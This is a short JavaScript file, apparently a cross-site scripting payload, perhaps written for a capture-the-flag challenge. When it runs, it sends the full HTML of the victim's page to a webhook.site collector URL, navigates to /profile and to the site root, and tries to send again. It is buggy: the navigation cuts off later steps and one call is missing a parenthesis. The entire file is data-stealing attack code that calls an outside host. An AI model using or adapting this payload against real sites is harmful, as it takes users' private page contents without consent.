// 1. Navigate to profile

async function sendData(){

  try {
    await fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML));
    console.log("Sucess!");
    window.location = "/profile";
    await fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML));
    console.log("Sucess!");
    window.location = "/";
    
    await fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(document.documentElement.outerHTML);
    console.log("Sucess!");
  } catch(error) {
    console.log(error);
  }
}


sendData();

